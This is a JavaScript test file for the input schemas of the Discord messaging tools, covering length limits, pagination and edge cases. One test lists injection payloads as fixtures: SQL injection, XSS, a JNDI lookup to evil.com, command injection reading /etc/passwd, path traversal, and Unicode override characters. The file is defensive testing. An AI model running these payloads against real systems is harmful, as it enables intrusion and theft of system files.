import test from 'ava';

// Test Discord input validation and sanitization by examining the schema definitions
test('discord_send_message - schema validates content length', async (t) => {
  // Import the schema from the actual discord module
  const { MessagePayload } = await import('../tools/discord.js');

  // Test valid content within limits
  const validMessage = {
    content: 'Hello, world!',
  };

  t.notThrows(() => MessagePayload.parse(validMessage));

  // Test empty content (should fail validation)
  const emptyMessage = {
    content: '',
  };

  t.throws(() => MessagePayload.parse(emptyMessage));

  // Test content at maximum length (2000 chars)
  const maxLengthContent = 'a'.repeat(2000);
  const maxLengthMessage = {
    content: maxLengthContent,
  };

  t.notThrows(() => MessagePayload.parse(maxLengthMessage));

  // Test content exceeding maximum length
  const overLengthContent = 'a'.repeat(2001);
  const overLengthMessage = {
    content: overLengthContent,
  };

  t.throws(() => MessagePayload.parse(overLengthMessage));
});

test('discord_send_message - schema requires content or embeds', async (t) => {
  const { MessagePayload } = await import('../tools/discord.js');

  // Test completely empty message (should fail)
  const emptyMessage = {};
  t.throws(() => MessagePayload.parse(emptyMessage));

  // Test message with empty content and no embeds (should fail)
  const emptyContentMessage = {
    content: '',
    embeds: [],
  };
  t.throws(() => MessagePayload.parse(emptyContentMessage));

  // Test message with valid content (should pass)
  const contentMessage = {
    content: 'Hello, world!',
  };
  t.notThrows(() => MessagePayload.parse(contentMessage));

  // Test message with valid embeds (should pass)
  const embedsMessage = {
    embeds: [{ title: 'Test Embed' }],
  };
  t.notThrows(() => MessagePayload.parse(embedsMessage));

  // Test message with both content and embeds (should pass)
  const bothMessage = {
    content: 'Hello, world!',
    embeds: [{ title: 'Test Embed' }],
  };
  t.notThrows(() => MessagePayload.parse(bothMessage));
});

test('discord_send_message - schema validates embed structure', async (t) => {
  const { MessagePayload } = await import('../tools/discord.js');

  // Test with invalid embed structure (should still pass schema validation)
  // as embeds are typed as 'unknown[]' - validation happens at API level
  const invalidEmbedsMessage = {
    content: 'Test',
    embeds: [
      { title: 123 }, // Invalid title type
      { description: {} }, // Invalid description type
      null, // Invalid embed object
      undefined, // Invalid embed object
    ],
  };

  // Schema should allow this as embed validation is not strict at this level
  t.notThrows(() => MessagePayload.parse(invalidEmbedsMessage));
});

test('discord_list_messages - schema validates pagination parameters', async (t) => {
  const { ListSchema } = await import('../tools/discord.js');

  // Test valid limit values
  const validLimit = { limit: 50 };
  t.notThrows(() => ListSchema.parse(validLimit));

  // Test limit at boundaries
  const minLimit = { limit: 1 };
  t.notThrows(() => ListSchema.parse(minLimit));

  const maxLimit = { limit: 100 };
  t.notThrows(() => ListSchema.parse(maxLimit));

  // Test invalid limit values (should fail)
  const zeroLimit = { limit: 0 };
  t.throws(() => ListSchema.parse(zeroLimit));

  const negativeLimit = { limit: -10 };
  t.throws(() => ListSchema.parse(negativeLimit));

  const overLimit = { limit: 101 };
  t.throws(() => ListSchema.parse(overLimit));

  // Test non-integer limit (should fail)
  const floatLimit = { limit: 50.5 };
  t.throws(() => ListSchema.parse(floatLimit));

  // Test string limit (should fail)
  const stringLimit = { limit: '50' };
  t.throws(() => ListSchema.parse(stringLimit));
});

test('discord_list_messages - schema validates pagination ID formats', async (t) => {
  const { ListSchema } = await import('../tools/discord.js');

  // Test valid snowflake-like IDs
  const validIds = [
    { before: '123456789012345678' },
    { after: '987654321098765432' },
    { around: '111111111111111111' },
  ];

  for (const validId of validIds) {
    t.notThrows(() => ListSchema.parse(validId));
  }

  // Test empty/missing IDs (should pass - they're optional)
  const emptyIds = [{}, { before: '' }, { after: undefined }];

  for (const emptyId of emptyIds) {
    t.notThrows(() => ListSchema.parse(emptyId));
  }

  // Test various string formats (should pass as they're treated as strings)
  const variousFormats = [
    { before: 'special-chars_@#$%' },
    { after: 'unicode: 世界' },
    { around: 'mixed-CASE-123' },
    { before: 'with spaces' },
    { after: 'with.dots' },
  ];

  for (const format of variousFormats) {
    t.notThrows(() => ListSchema.parse(format));
  }
});

test('discord tools - schema prevents injection through parameter validation', async (t) => {
  const { MessagePayload, ListSchema } = await import('../tools/discord.js');

  // Test various potentially malicious inputs that should be handled by schema validation
  const injectionAttempts = [
    // SQL injection (passes schema validation but should be sanitized at API level)
    { content: "'; DROP TABLE messages; --" },
    { content: "' OR '1'='1" },

    // XSS attempts (pass schema validation but should be sanitized at API level)
    { content: '<script>alert("xss")</script>' },
    { content: 'javascript:alert("xss")' },
    { content: '<img src=x onerror=alert("xss")>' },

    // Template injection (pass schema validation but should be sanitized at API level)
    { content: '${jndi:ldap://evil.com/a}' },
    { content: '${7*7}' },

    // Command injection (pass schema validation but should be sanitized at API level)
    { content: '; cat /etc/passwd' },
    { content: '`whoami`' },
    { content: '$(id)' },

    // Path traversal (pass schema validation but should be sanitized at API level)
    { content: '../../../etc/passwd' },
    { content: '..\\..\\..\\windows\\system32' },

    // Null bytes and control characters
    { content: 'test\x00content' },
    { content: 'test\r\ncontent' },
    { content: 'test\tcontent' },

    // Unicode attacks
    { content: '\u202E_RIGHT-TO-LEFT_OVERRIDE_' },
    { content: '\u200D_ZERO_WIDTH_JOINER_' },
    { content: '\uFEFF_ZERO_WIDTH_NO-BREAK_SPACE_' },
  ];

  // All these should pass schema validation (content is valid string)
  // but should be handled by Discord API or the DiscordRestProxy
  for (const injection of injectionAttempts) {
    t.notThrows(() => MessagePayload.parse(injection));
  }

  // Test similar inputs for list parameters
  const maliciousListParams = [
    { before: '<script>alert("xss")</script>' },
    { after: 'javascript:void(0)' },
    { around: '${jndi:ldap://evil.com/a}' },
    { limit: 50, before: ' OR 1=1--' },
    { limit: 100, after: '../../../etc/passwd' },
  ];

  for (const maliciousParam of maliciousListParams) {
    t.notThrows(() => ListSchema.parse(maliciousParam));
  }
});

test('discord tools - schema handles edge cases', async (t) => {
  const { MessagePayload } = await import('../tools/discord.js');

  // Test very long strings (within content limit)
  const longContent = 'a'.repeat(2000);
  t.notThrows(() => MessagePayload.parse({ content: longContent }));

  // Test empty objects with required fields
  t.notThrows(() => MessagePayload.parse({ content: 'test' }));

  // Test null values for optional fields (should be rejected for security)
  const nullOptionalFields = {
    content: 'test',
    embeds: null,
    allowed_mentions: null,
    tts: null,
    components: null,
    attachments: null,
  };
  // Zod correctly rejects null values for optional fields - good security behavior
  t.throws(() => MessagePayload.parse(nullOptionalFields));

  // Test arrays with mixed types for embeds
  const mixedEmbeds = {
    content: 'test',
    embeds: [{ title: 'Valid' }, null, undefined, {}, { description: 'Also valid' }],
  };
  t.notThrows(() => MessagePayload.parse(mixedEmbeds));

  // Test boolean flags
  const booleanFlags = {
    content: 'test',
    tts: true,
    allowed_mentions: { parse: [] },
  };
  t.notThrows(() => MessagePayload.parse(booleanFlags));
});

test('discord tools - environment variable requirements', async (t) => {
  // Test that the tools properly validate required environment variables
  // This is a schema-level test, actual environment variable handling
  // is tested in the integration tests

  const { createDiscordSendMessageTool, createDiscordListMessagesTool } = await import(
    '../tools/discord.js'
  );

  // Both tools should be ToolFactory functions
  t.is(typeof createDiscordSendMessageTool, 'function');
  t.is(typeof createDiscordListMessagesTool, 'function');

  // Create tools with mock context
  const mockContext = {
    env: {
      DISCORD_PROVIDER: 'test-provider',
      DISCORD_TENANT: 'test-tenant',
      DISCORD_SPACE_URN: 'test-space-urn',
    },
    fetch: global.fetch,
    now: () => new Date(),
  };

  // Tools should create successfully with proper context
  const sendMessageTool = createDiscordSendMessageTool()(mockContext);
  const listMessagesTool = createDiscordListMessagesTool()(mockContext);

  // Tools should have the expected structure
  t.truthy(sendMessageTool.spec);
  t.truthy(sendMessageTool.invoke);
  t.truthy(listMessagesTool.spec);
  t.truthy(listMessagesTool.invoke);

  // Tool specs should have proper schema definitions
  t.truthy(sendMessageTool.spec.inputSchema);
  t.truthy(listMessagesTool.spec.inputSchema);

  // Input schemas should have the expected properties
  t.truthy(sendMessageTool.spec.inputSchema?.message);
  t.truthy(listMessagesTool.spec.inputSchema?.limit);
});
